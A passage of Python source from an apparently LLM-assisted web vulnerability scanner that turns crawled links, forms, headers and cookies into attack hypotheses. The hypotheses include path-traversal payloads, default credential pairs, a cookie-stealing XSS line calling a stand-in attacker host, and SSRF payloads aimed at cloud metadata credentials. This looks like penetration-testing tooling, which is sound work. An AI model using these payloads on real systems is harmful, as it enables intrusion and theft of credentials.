            "  • Trial extension: re-register same email or modify trial_end_date in request body\n\n"

            "=== OUTPUT RULES ===\n"
            "- Do NOT repeat hypotheses already in ALREADY COVERED\n"
            "- 'details' MUST contain exact payloads, parameter names, and reproduction steps\n"
            "- 'location' MUST be the full absolute URL or path including query string\n"
            "- 'type' MUST be the precise vulnerability class (e.g. 'Reflected XSS', not just 'XSS')\n"
            "- Assign accurate CVSS 3.1 Base Score and Vector for each finding\n"
            f"- Output AT MOST {self.max_llm_hypotheses} hypotheses (prioritise highest severity)\n\n"

            "OUTPUT: ONLY a valid JSON array, no markdown, no explanation:\n"
            '[{"type":"<precise vuln class>","details":"<exact payload + repro steps>","location":"<absolute URL or path?param>","cvss_score":<float>,"cvss_vector":"<CVSS:3.1/...>","severity":"<Informational|Low|Medium|High|Critical>"}]'
        )

    # ------------------------------------------------------------------
    # Phase A helpers — deterministic structural analysis
    # ------------------------------------------------------------------

    @staticmethod
    def _classify_links(links: list) -> list:
        """Classify each discovered link by analysing its path segments and
        query parameter names against the semantic keyword tables.
        Returns hypothesis dicts, one per unique (vuln_type, path_root)."""
        seen = set()
        hypotheses = []

        for link in links:
            try:
                parsed = urlparse(link)
                path_lower = parsed.path.lower()
                params = parse_qs(parsed.query)
            except Exception:
                continue

            # --- Deterministic Default Credentials check (independent of keyword-map break) ---
            _dc_pattern = r"login|signin|auth|logon|admin|manage|dashboard|panel|backoffice|staff|superuser"
            if re.search(_dc_pattern, path_lower) and ("Default Credentials", path_lower) not in seen:
                seen.add(("Default Credentials", path_lower))
                hypotheses.append({
                    "type": "Default Credentials",
                    "details": (
                        f"Login/admin endpoint '{parsed.path}' detected. "
                        "Test default credential pairs: admin/admin, admin/password, admin/123456, "
                        "root/root, root/toor, test/test, guest/guest, user/user, "
                        "administrator/administrator, admin/admin123. "
                        "Navigate to the page, fill in the login form with each pair, "
                        "and check for an authenticated session (redirect, dashboard, welcome message)."
                    ),
                    "location": link,
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "severity": "Critical",
                })

            # --- Path keyword analysis ---
            for pattern, vtype, severity, score, vector in PATH_KEYWORD_MAP:
                if re.search(pattern, path_lower) and (vtype, path_lower) not in seen:
                    seen.add((vtype, path_lower))
                    # Generate richer details based on vuln type
                    if "traversal" in vtype.lower() or "file" in vtype.lower() or "lfi" in vtype.lower():
                        _pt_details = (
                            f"File-serving endpoint '{parsed.path}' detected. "
                            f"Test for Path Traversal by injecting traversal sequences into any filename/path parameter. "
                            f"Common patterns to try:\n"
                            f"  1. GET {parsed.path}?filename=../../../etc/passwd\n"
                            f"  2. GET {parsed.path}?file=../../../../etc/passwd\n"
                            f"  3. GET {parsed.path}?path=../../../etc/passwd\n"
                            f"  Encoded: {parsed.path}?filename=..%2f..%2f..%2fetc%2fpasswd\n"
                            f"  Double encoded: {parsed.path}?filename=..%252f..%252f..%252fetc%252fpasswd\n"
                            f"SUCCESS = /etc/passwd contents (root:x:0:0:, daemon:x:, /bin/bash) in response."
                        )
                    else:
                        _pt_details = f"Endpoint '{parsed.path}' detected via path keyword analysis. Test for {vtype}."
                    hypotheses.append({
                        "type": vtype,
                        "details": _pt_details,
                        "location": link,
                        "cvss_score": score,
                        "cvss_vector": vector,
                        "severity": severity,
                    })
                    break  # one type per link

            # --- Query parameter name analysis ---
            for param_name in params:
                for pattern, vtype, severity, score, vector in PARAM_KEYWORD_MAP:
                    if re.search(pattern, param_name, re.IGNORECASE) and (vtype, param_name) not in seen:
                        seen.add((vtype, param_name))
                        # Richer details for file/path params
                        if re.search(r"file|filename|path|img|image|photo|pic|resource|asset|media|download", param_name, re.IGNORECASE):
                            _param_details = (
                                f"Parameter '{param_name}' at '{parsed.path}' accepts a filename/path value — "
                                f"test for Path Traversal / LFI. "
                                f"Payloads: ?{param_name}=../../../etc/passwd  |  "
                                f"?{param_name}=..%2f..%2f..%2fetc%2fpasswd  |  "
                                f"?{param_name}=....//....//....//etc/passwd\n"
                                f"SUCCESS = file contents (root:x:0:0:, daemon:x:, /bin/bash) in response body."
                            )
                        else:
                            _param_details = f"Parameter '{param_name}' at '{parsed.path}' — test for {vtype} (e.g. inject payload into {param_name})."
                        hypotheses.append({
                            "type": vtype,
                            "details": _param_details,
                            "location": link,
                            "cvss_score": score,
                            "cvss_vector": vector,
                            "severity": severity,
                        })
                        break

        return hypotheses

    @staticmethod
    def _classify_forms(forms: list) -> list:
        """Classify forms by analysing their action URL, method, and input names."""
        seen = set()
        hypotheses = []

        for form in forms:
            action = form.get("action", "/")
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])
            input_names = " ".join(i.get("name", "") for i in inputs).lower()
            input_types = " ".join(i.get("type", "") for i in inputs).lower()

            # --- Deterministic Default Credentials hypothesis for login forms ---
            _has_user_field  = bool(re.search(r"username|user|login|email", input_names, re.IGNORECASE))
            _has_pass_field  = bool(re.search(r"password|pass", input_types + " " + input_names, re.IGNORECASE))
            if _has_user_field and _has_pass_field and ("Default Credentials", action) not in seen:
                seen.add(("Default Credentials", action))
                input_list = ", ".join(i.get("name", "") for i in inputs if i.get("name"))
                hypotheses.append({
                    "type": "Default Credentials",
                    "details": (
                        f"Login form detected at '{action}' with inputs [{input_list}]. "
                        "Test default credential pairs: admin/admin, admin/password, admin/123456, "
                        "root/root, root/toor, test/test, guest/guest, user/user, "
                        "administrator/administrator, admin/admin123. "
                        "Submit each pair via POST to the form action and check for authenticated session."
                    ),
                    "location": action,
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "severity": "Critical",
                })

            for name_pattern, type_pattern, vtype in FORM_INPUT_MAP:
                name_match = re.search(name_pattern, input_names, re.IGNORECASE)
                type_match = (type_pattern is None) or re.search(type_pattern, input_types + " " + input_names, re.IGNORECASE)

                if name_match and type_match and (vtype, action) not in seen:
                    seen.add((vtype, action))
                    input_list = ", ".join(i.get("name", "") for i in inputs if i.get("name"))
                    hypotheses.append({
                        "type": vtype,
                        "details": f"{method} form at '{action}' with inputs [{input_list}] — test for {vtype}.",
                        "location": action,
                        "cvss_score": 7.5,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        "severity": "High",
                    })
                    break

        return hypotheses

    @staticmethod
    def _classify_headers(missing_headers: list, server_info: str, x_powered_by: str,
                           cookie_issues: list, target_url: str) -> list:
        """Generate deterministic Informational hypotheses from HTTP header analysis."""
        hypotheses = []

        # All structural header/disclosure findings are Informational (CVSS score 0.0).
        # These are passive observations, not directly exploitable vulnerabilities.
        for hdr in missing_headers:
            hdr_lower = hdr.lower().strip()
            if hdr_lower in HEADER_VULN_MAP:
                title, _, _, details = HEADER_VULN_MAP[hdr_lower]
                hypotheses.append({
                    "type": title,
                    "details": details,
                    "location": target_url,
                    "cvss_score": 0.0,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
                    "severity": "Informational",
                })

        if server_info and server_info not in ("Unknown", ""):
            hypotheses.append({
                "type": "Server Version Disclosure",
                "details": f"Server header discloses version '{server_info}'. Research known CVEs for this version.",
                "location": target_url,
                "cvss_score": 0.0,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
                "severity": "Informational",
            })

        if x_powered_by:
            hypotheses.append({
                "type": "Technology Disclosure via X-Powered-By",
                "details": f"X-Powered-By: '{x_powered_by}' discloses backend technology. May expose version-specific vulnerabilities.",
                "location": target_url,
                "cvss_score": 0.0,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
                "severity": "Informational",
            })

        for cookie_raw in cookie_issues:
            flags = []
            cl = cookie_raw.lower()
            if "httponly" not in cl:
                flags.append("missing HttpOnly")
            if "secure" not in cl:
                flags.append("missing Secure")
            if flags:
                hypotheses.append({
                    "type": "Insecure Cookie Flags",
                    "details": f"Cookie '{cookie_raw[:80]}' has {', '.join(flags)} — susceptible to XSS-based theft and network interception.",
                    "location": target_url,
                    "cvss_score": 0.0,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
                    "severity": "Informational",
                })

        return hypotheses


    # ------------------------------------------------------------------
    # Cookie-based Insecure Deserialization detection
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_serial_cookie(name: str, value: str) -> dict | None:
        """Analyse a single cookie value for known serialization patterns.

        Returns a dict with keys (format, severity, details) if a pattern is
        found, or None if the cookie looks like a plain/opaque value.
        """
        import base64 as _b64
        import re as _re

        v = value.strip()

        # ── JWT ──────────────────────────────────────────────────────────────
        # Three dot-separated base64url segments starting with eyJ ({"…)
        if _re.match(r'^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*$', v):
            try:
                header_b64 = v.split(".")[0]
                # Fix padding
                header_b64 += "=" * (-len(header_b64) % 4)
                header_json = _b64.urlsafe_b64decode(header_b64).decode("utf-8", errors="replace")
            except Exception:
                header_json = ""
            return {
                "format": "JWT",
                "severity": "High",
                "cvss_score": 8.1,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                "details": (
                    f"Cookie '{name}' contains a JWT token. "
                    f"Header: {header_json[:120]}. "
                    "Test for alg=none bypass, weak HMAC secret (HS256 brute-force), "
                    "and privilege escalation by modifying payload claims."
                ),
            }

        # ── PHP serialization ────────────────────────────────────────────────
        # Raw PHP: O:N:"ClassName":...  or a:N:{...}  or s:N:"..."
        if _re.match(r'^[OoAaSsIiBbNn]:\d+[:{]', v):
            return {
                "format": "PHP serialized object",
                "severity": "Critical",
                "cvss_score": 9.8,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "details": (
                    f"Cookie '{name}' contains a raw PHP serialized value: '{v[:80]}'. "
                    "Inject a crafted PHP object to exploit __wakeup() / __destruct() "
                    "magic methods and achieve RCE or privilege escalation."
                ),
            }

        # Base64-encoded PHP: decode and check again
        try:
            decoded = _b64.b64decode(v + "==").decode("utf-8", errors="replace")
            if _re.match(r'^[OoAaSsIiBbNn]:\d+[:{]', decoded):
                return {
                    "format": "PHP serialized object (base64-encoded)",
                    "severity": "Critical",
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "details": (
                        f"Cookie '{name}' contains a base64-encoded PHP serialized value. "
                        f"Decoded: '{decoded[:80]}'. "
                        "Craft a PHP object payload to exploit magic method deserialization."
                    ),
                }
        except Exception:
            pass

        # ── Java serialized object ───────────────────────────────────────────
        # Java serialized streams start with 0xACED0005; base64 of that is rO0A
        if v.startswith("rO0") or v.startswith("rO0A"):
            return {
                "format": "Java serialized object",
                "severity": "Critical",
                "cvss_score": 9.8,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "details": (
                    f"Cookie '{name}' starts with '{v[:12]}' — the base64 signature of a "
                    "Java serialized ObjectInputStream. "
                    "Use ysoserial gadget chains (CommonsCollections, Spring, etc.) to achieve RCE."
                ),
            }

        # ── Python pickle ────────────────────────────────────────────────────
        # Pickle protocol 2+ opcodes in base64: gASV, gAR, gAS, cos, etc.
        try:
            decoded_bytes = _b64.b64decode(v + "==")
            # Protocol 2+: starts with \x80\x02, \x80\x03, \x80\x04, or \x80\x05
            if decoded_bytes[:2] in (b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05'):
                return {
                    "format": "Python pickle",
                    "severity": "Critical",
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "details": (
                        f"Cookie '{name}' contains a base64-encoded Python pickle object "
                        f"(protocol byte: {decoded_bytes[1]}). "
                        "Inject a malicious pickle payload using os.system or subprocess to achieve RCE."
                    ),
                }
        except Exception:
            pass

        # ── Ruby Marshal ─────────────────────────────────────────────────────
        try:
            decoded_bytes = _b64.b64decode(v + "==")
            if decoded_bytes[:2] == b'':
                return {
                    "format": "Ruby Marshal",
                    "severity": "Critical",
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "details": (
                        f"Cookie '{name}' appears to be a base64-encoded Ruby Marshal object. "
                        "Craft a malicious Marshal payload to achieve RCE via _load / marshal.load."
                    ),
                }
        except Exception:
            pass

        # ── Flask/Werkzeug signed session cookie ─────────────────────────────
        # Flask sessions: eyJ....<sig> with a dot-separated structure (but only 2 parts or base64 body)
        if v.startswith("eyJ") and "." in v and not _re.match(
            r'^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*$', v
        ):
            return {
                "format": "Flask/Werkzeug signed session",
                "severity": "High",
                "cvss_score": 7.5,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                "details": (
                    f"Cookie '{name}' resembles a Flask signed session cookie. "
                    "The payload is only base64-encoded (not encrypted). "
                    "Use flask-unsign to brute-force the secret key and forge arbitrary session data."
                ),
            }

        # ── Node.js express-session / connect.sid ────────────────────────────
        if name.lower() in ("connect.sid", "express.sid", "session") and v.startswith("s:"):
            return {
                "format": "Node.js signed session",
                "severity": "Medium",
                "cvss_score": 6.5,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
                "details": (
                    f"Cookie '{name}' is a Node.js signed session cookie (s: prefix). "
                    "If the SESSION_SECRET is weak or default, forge a session with elevated privileges."
                ),
            }

        return None

    @staticmethod
    def _classify_cookies_deserialization(cookie_security: list, target_url: str) -> list:
        """Scan all Set-Cookie values for serialization/deserialization patterns.

        cookie_security is the full list of dicts from workspace.get_recon_data("cookie_security"),
        each with keys: raw, httponly, secure, samesite.
        """
        hypotheses = []
        seen_names = set()

        for entry in cookie_security:
            raw = entry.get("raw", "")
            if not raw:
                continue

            # Parse "name=value; attributes..."
            parts = raw.split(";")
            first = parts[0].strip()
            if "=" not in first:
                continue
            name, _, value = first.partition("=")
            name = name.strip()
            value = value.strip()

            if not value or name in seen_names:
                continue
            seen_names.add(name)

            result = VulnAnalyzerAgent._detect_serial_cookie(name, value)
            if result:
                hypotheses.append({
                    "type": f"Insecure Deserialization via Cookie ({result['format']})",
                    "details": result["details"],
                    "location": target_url,
                    "cvss_score": result["cvss_score"],
                    "cvss_vector": result["cvss_vector"],
                    "severity": result["severity"],
                })

        return hypotheses

    # ------------------------------------------------------------------
    # CVSS 3.1 post-processing — clamp LLM scores to valid severity ranges

    # ------------------------------------------------------------------

    @staticmethod
    def _clamp_cvss(severity: str, score: float) -> float:
        """Ensure a CVSS score falls within the correct range for its severity.

        CVSS 3.1 ranges:
          None          = 0.0
          Informational = 0.0  (not a standard CVSS severity; map to 0.0)
          Low           = 0.1 – 3.9
          Medium        = 4.0 – 6.9
          High          = 7.0 – 8.9
          Critical      = 9.0 – 10.0
        """
        _RANGES = {
            "none":          (0.0, 0.0),
            "informational": (0.0, 0.0),
            "low":           (0.1, 3.9),
            "medium":        (4.0, 6.9),
            "high":          (7.0, 8.9),
            "critical":      (9.0, 10.0),
        }
        sev = severity.lower().strip()
        if sev not in _RANGES:
            return score
        lo, hi = _RANGES[sev]
        if lo == hi == 0.0:
            return 0.0
        try:
            return round(max(lo, min(hi, float(score))), 1)
        except (TypeError, ValueError):
            return lo  # fallback to the floor of the range

    # ------------------------------------------------------------------
    # Multi-page attack chain detection
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_attack_chains(page_contexts: dict) -> list:
        """Analyse per-page contexts to detect exploitable multi-step attack chains.

        Chains detected:
        1. File Upload + Path Traversal endpoint → RCE via upload + LFI
        2. XSS-capable page + Admin panel page → Stored XSS → Account Takeover
        3. User ID / resource ID exposed on one page + parameterised endpoint on another → IDOR chain
        4. Open redirect parameter + OAuth / login flow → Token theft
        5. SSRF-capable parameter + cloud metadata endpoint accessible → Cloud credential theft
        6. Debug / error page with stack trace + authenticated endpoint → Info leak → privilege chain
        """
        chains = []
        if not page_contexts:
            return chains

        pages = list(page_contexts.items())   # [(url, ctx), ...]

        # Collect page-level signals
        upload_pages:   list = []
        traversal_pages: list = []
        xss_pages:      list = []
        admin_pages:    list = []
        id_param_pages: list = []
        redirect_pages: list = []
        oauth_pages:    list = []
        ssrf_pages:     list = []
        debug_pages:    list = []

        _id_re      = re.compile(r'[?&](id|uid|user_id|user|account|profile|item|object|resource)=', re.I)
        _redir_re   = re.compile(r'[?&](redirect|return|next|url|callback|goto|dest)=', re.I)
        _ssrf_re    = re.compile(r'[?&](url|uri|endpoint|host|target|fetch|load|proxy|resource)=', re.I)
        _debug_re   = re.compile(r'(?:traceback|exception|stack.trace|debug=true|werkzeug|flask.debug)', re.I)
        _oauth_re   = re.compile(r'(?:/oauth|/authorize|/auth|/login|/sso|/oidc|redirect_uri)', re.I)
        _xss_re     = re.compile(r'(?:/search|/comment|/post|/message|/feedback|/review|/query)', re.I)
        _trav_re    = re.compile(r'[?&](file|filename|path|img|image|photo|doc|page|resource|asset)=', re.I)

        for url, ctx in pages:
            # File upload
            if ctx.get("has_file_upload"):
                upload_pages.append(url)
            # Path traversal parameter
            if _trav_re.search(url):
                traversal_pages.append(url)
            # XSS-prone endpoint (search/comment/feedback)
            if _xss_re.search(url):
                xss_pages.append(url)
            # Admin / privileged panel
            if ctx.get("has_admin_path") or any(
                kw in url.lower() for kw in ["/admin", "/dashboard", "/manage", "/panel", "/staff", "/moderator"]
            ):
                admin_pages.append(url)
            # IDOR — ID parameters
            if _id_re.search(url) or any(_id_re.search(f.get("action", "")) for f in ctx.get("forms", [])):
                id_param_pages.append(url)
            # Open redirect
            if _redir_re.search(url):
                redirect_pages.append(url)
            # OAuth / login flow
            if _oauth_re.search(url):
                oauth_pages.append(url)
            # SSRF
            if _ssrf_re.search(url):
                ssrf_pages.append(url)
            # Debug / error page
            all_titles = ctx.get("title", "").lower()
            if _debug_re.search(url) or _debug_re.search(all_titles):
                debug_pages.append(url)

        # ── Chain 1: File Upload + Path Traversal = RCE ───────────────────────
        if upload_pages and traversal_pages:
            chains.append({
                "type": "Attack Chain: File Upload → Path Traversal / RCE",
                "details": (
                    "Multi-step RCE chain detected.\n"
                    f"Step 1 — Upload a PHP/ASP/JSP webshell via file upload form at: {upload_pages[0]}\n"
                    f"Step 2 — Use path traversal parameter to reach uploaded file: {traversal_pages[0]}\n"
                    "Confirm upload destination matches the traversal-accessible path.\n"
                    "Success indicator: webshell response (e.g. command output) from traversal URL."
                ),
                "location": f"{upload_pages[0]} → {traversal_pages[0]}",
                "cvss_score": 9.8,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "severity": "Critical",
            })

        # ── Chain 2: XSS + Admin panel = Session Hijacking / ATO ─────────────
        if xss_pages and admin_pages:
            chains.append({
                "type": "Attack Chain: XSS → Admin Session Hijacking",
                "details": (
                    "Stored/Reflected XSS on a user-facing endpoint combined with an admin panel.\n"
                    f"XSS injection point : {xss_pages[0]}\n"
                    f"Admin target page   : {admin_pages[0]}\n"
                    "Payload: <script>fetch('https://attacker/steal?c='+document.cookie)</script>\n"
                    "If XSS executes in admin context, attacker obtains admin session cookie → ATO."
                ),
                "location": f"{xss_pages[0]} → {admin_pages[0]}",
                "cvss_score": 8.8,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
                "severity": "High",
            })

        # ── Chain 3: IDOR across pages = Horizontal / Vertical Privilege Escalation ──
        if len(id_param_pages) >= 2:
            chains.append({
                "type": "Attack Chain: Cross-Page IDOR → Privilege Escalation",
                "details": (
                    "Resource IDs exposed across multiple pages — horizontal or vertical escalation possible.\n"
                    f"Page A (ID leak) : {id_param_pages[0]}\n"
                    f"Page B (ID use)  : {id_param_pages[1]}\n"
                    "Enumerate IDs from Page A; substitute into Page B parameters.\n"
                    "Test: change numeric IDs by ±1, try id=1 (first/admin record), check response differences."
                ),
                "location": f"{id_param_pages[0]} → {id_param_pages[1]}",
                "cvss_score": 8.1,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                "severity": "High",
            })

        # ── Chain 4: Open Redirect + OAuth = Token Theft ──────────────────────
        if redirect_pages and oauth_pages:
            chains.append({
                "type": "Attack Chain: Open Redirect → OAuth Token Theft",
                "details": (
                    "Open redirect parameter combined with OAuth/login flow.\n"
                    f"Open redirect endpoint : {redirect_pages[0]}\n"
                    f"OAuth / login endpoint : {oauth_pages[0]}\n"
                    "Exploit: craft OAuth redirect_uri pointing to the open redirect, "
                    "chain to attacker-controlled server to capture the authorisation code/token.\n"
                    "Test: GET /oauth/authorize?client_id=X&redirect_uri="
                    + redirect_pages[0] + "?next=https://attacker.com"
                ),
                "location": f"{redirect_pages[0]} → {oauth_pages[0]}",
                "cvss_score": 8.1,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
                "severity": "High",
            })

        # ── Chain 5: SSRF + internal metadata = Cloud Credential Theft ───────
        if ssrf_pages:
            chains.append({
                "type": "Attack Chain: SSRF → Cloud Metadata / Internal Service Access",
                "details": (
                    "SSRF-capable parameter that may reach internal services or cloud metadata.\n"
                    f"SSRF endpoint : {ssrf_pages[0]}\n"
                    "Payloads to test:\n"
                    "  http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
                    "  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n"
                    "  http://localhost:8080/   (internal admin)\n"
                    "  http://192.168.0.1/      (internal network scan)\n"
                    "Success: AWS/GCP credentials, internal service responses in the application reply."
                ),
                "location": ssrf_pages[0],
                "cvss_score": 9.0,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
                "severity": "Critical",
            })

        # ── Chain 6: Debug / error page → Info leak → Privilege chain ─────────
        if debug_pages and admin_pages:
            chains.append({
                "type": "Attack Chain: Debug Info Leak → Privilege Escalation",
                "details": (
                    "Verbose error / debug page combined with a privileged endpoint.\n"
                    f"Debug / error page : {debug_pages[0]}\n"
                    f"Privileged target  : {admin_pages[0]}\n"
                    "Trigger the error page to extract: secret keys, DB credentials, API tokens, "
                    "internal paths, session signing secrets.\n"
                    "Use extracted secrets to forge session tokens or authenticate to the admin panel."
                ),
                "location": f"{debug_pages[0]} → {admin_pages[0]}",
                "cvss_score": 8.6,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
                "severity": "High",
            })

        return chains

    # ------------------------------------------------------------------
    # Main execution
    # ------------------------------------------------------------------

    async def execute(self, workspace: WorkspaceManager):
        from src.core.sanitizer import sanitise
        target_url = workspace.target_url
        structured = workspace.get_recon_data("structured") or {}
        # P0: sanitise surface_map (raw recon content from target) before LLM injection
        _raw_surface = workspace.get_recon_data("surface_map") or "No recon data available."
        surface_map, _ = sanitise(_raw_surface, label="recon surface_map")

        links   = structured.get("links_found", [])
        forms   = structured.get("forms", [])
        params  = structured.get("query_params_seen", [])
        js_eps  = structured.get("hidden_js_endpoints", [])

        server_header  = workspace.get_recon_data("server_info") or structured.get("server_header", "")
        x_powered_by   = structured.get("x_powered_by", "")
        missing_headers = workspace.get_recon_data("missing_security_headers") or structured.get("missing_security_headers", [])
        cookie_issues  = structured.get("cookie_security_issues", [])
        # Full cookie_security list (all cookies, not just insecure-flagged)
        cookie_security_full = workspace.get_recon_data("cookie_security") or []

        # ── Phase A: Deterministic structural analysis ────────────────────────
        link_hypos   = self._classify_links(links)
        form_hypos   = self._classify_forms(forms)
        header_hypos = self._classify_headers(missing_headers, server_header, x_powered_by, cookie_issues, target_url)
        deser_hypos  = self._classify_cookies_deserialization(cookie_security_full, target_url)

        all_structural = link_hypos + form_hypos + header_hypos + deser_hypos

        # ── Cross-scan memory: filter known false positives before injecting ──
        import re as _re_vuln
        _mem = workspace.memory
        _filtered_structural = []
        _fp_skipped = 0
        for h in all_structural:
            _h_url = h.get("location", "")
            _pm2 = _re_vuln.search(r'[?&]([^=&]+)=', _h_url)
            _h_param = _pm2.group(1) if _pm2 else ""
            if _mem.is_false_positive(h["type"], _h_url, _h_param):
                _fp_skipped += 1
            else:
                _filtered_structural.append(h)
        if _fp_skipped:
            print(f"[Memory] Skipped {_fp_skipped} structural hypothesis(es) — known false positives.")
        all_structural = _filtered_structural

        for h in all_structural:
            workspace.add_hypothesis(
                h["type"], h["details"], h["location"],
                cvss_score=h["cvss_score"],
                cvss_vector=h["cvss_vector"],
                severity=h["severity"],
            )
        print(
            f"[+] Structural analysis: {len(link_hypos)} link, {len(form_hypos)} form, "
            f"{len(header_hypos)} header hypotheses injected."
        )

        # ── Phase A.5: Multi-page chain detection ────────────────────────────
        chain_hypos = self._detect_attack_chains(workspace.get_page_contexts())
        for h in chain_hypos:
            workspace.add_hypothesis(
                h["type"], h["details"], h["location"],
                cvss_score=h["cvss_score"],
                cvss_vector=h["cvss_vector"],
                severity=h["severity"],
            )
        if chain_hypos:
            print(f"[+] Chain analysis: {len(chain_hypos)} chained attack hypothesis/hypotheses added.")

        # ── Phase B: LLM contextual analysis ────────────────────────────────
        from src.core.llm import OllamaEngine as _OllamaEngine
        _is_ollama = isinstance(self.engine, _OllamaEngine)

        # Tell the LLM exactly what was already discovered so it doesn't repeat it.
        covered_text = "\n".join(
            f"  - [{h['type']}] {h['location']}" for h in all_structural
        ) or "  None"

        forms_text = ""
        for f in forms:
            inputs = ", ".join(f"{i['name']}({i['type']})" for i in f.get("inputs", []))
            forms_text += f"  - {f['method']} {f['action']}: inputs=[{inputs}]\n"

        # Ollama (small model): trim context aggressively to stay within context window
        # and reduce hallucination — use fewer links, no JS endpoints, shorter surface map.
        if _is_ollama:
            links_text  = "\n".join(f"  - {l}" for l in links[:10])
            params_text = ", ".join(params[:8])
            js_eps_text = "\n".join(f"  - {e}" for e in js_eps[:5])
            surface_map_text = surface_map[:800]
        else:
            links_text  = "\n".join(f"  - {l}" for l in links[:30])
            params_text = ", ".join(params[:15])
            js_eps_text = "\n".join(f"  - {e}" for e in js_eps[:20])
            surface_map_text = surface_map[:2000]

        # ── Cross-scan memory: enrich LLM context with historical knowledge ──
        _prior_tech      = workspace.memory.get_tech_stack()
        _prior_confirmed = workspace.memory.get_confirmed_vulns()
        _prior_potential = workspace.memory.get_potential_vulns()
        _prior_tech_text = ", ".join(_prior_tech) if _prior_tech else "None"
        _prior_confirmed_text = (
            "\n".join(
                f"  - [{v['type']}] {v.get('url','')} (confirmed {v.get('confirm_count',1)}x)"
                for v in _prior_confirmed[:10]
            ) or "  None"
        )
        _prior_potential_text = (
            "\n".join(
                f"  - [Potential {v['type']}] {v.get('url','')} "
                f"(seen {v.get('seen_count',1)}x — partial indicators, needs aggressive retesting)"
                for v in _prior_potential[:8]
            ) or "  None"
        )

        # Build dynamic WSTG hints based on all known tech signals:
        # combine memory's prior tech stack + live recon headers
        _all_tech = list(_prior_tech)
        _live_server = (server_header + " " + x_powered_by).lower()
        for _kw in ["php", "django", "flask", "node", "express", "react", "angular",
                    "vue", "spring", "rails", "wordpress", "graphql", "mysql",
                    "postgresql", "nginx", "apache", "jwt", "oauth", "aws", "azure"]:
            if _kw in _live_server and _kw not in [t.lower() for t in _all_tech]:
                _all_tech.append(_kw)
        _wstg_hints = _build_tech_wstg_hints(_all_tech)

        messages = [
            {"role": "user", "content": (
                f"Target: {target_url}\n\n"
                f"=== ALREADY COVERED (DO NOT REPEAT) ===\n{covered_text}\n\n"
                f"=== PRIOR SCAN KNOWLEDGE (from memory) ===\n"
                f"  Previously detected tech stack: {_prior_tech_text}\n"
                f"  Previously confirmed vulnerabilities:\n{_prior_confirmed_text}\n"
                f"  Previously found as POTENTIAL (needs harder testing next scan):\n{_prior_potential_text}\n\n"
                + (_wstg_hints if _wstg_hints else "")
                + f"=== SERVER ===\n  {server_header}  {x_powered_by}\n\n"
                f"=== CRAWLED LINKS ===\n{links_text or '  None'}\n\n"
                f"=== FORMS ===\n{forms_text or '  None'}\n\n"
                f"=== QUERY PARAMS SEEN ===\n  {params_text or 'None'}\n\n"
                f"=== HIDDEN JS ENDPOINTS ===\n{js_eps_text or '  None'}\n\n"
                f"=== ATTACK SURFACE SUMMARY ===\n{surface_map_text}\n\n"
                "Now generate ADDITIONAL hypotheses that require contextual reasoning:\n"
                "- Business logic flaws, chained attacks, app-specific issues\n"
                "- Specific payloads for the forms/parameters above\n"
                "- Any links/JS endpoints NOT already in ALREADY COVERED\n"
                "- Consider the prior scan knowledge above — focus on NEW or unresolved issues\n"
                "- Prioritise the DYNAMIC WSTG HINTS above if tech stack was detected\n"
                "Return ONLY a JSON array. No explanation."
            )}
        ]

        # Ollama: lower temperature for deterministic JSON output, smaller token budget
        _llm_kwargs: dict = {"messages": messages, "system_prompt": self.system_prompt}
        if _is_ollama:
            _llm_kwargs["max_tokens"] = 2048
            _llm_kwargs["temperature"] = 0.1
        else:
            _llm_kwargs["max_tokens"] = 4096

        response = await self.engine.generate_response(**_llm_kwargs)

        result_text = self.engine.extract_text(response)
        print("[+] LLM contextual hypotheses generated.")

        # Robust JSON parsing with retry
        for attempt in range(2):
            try:
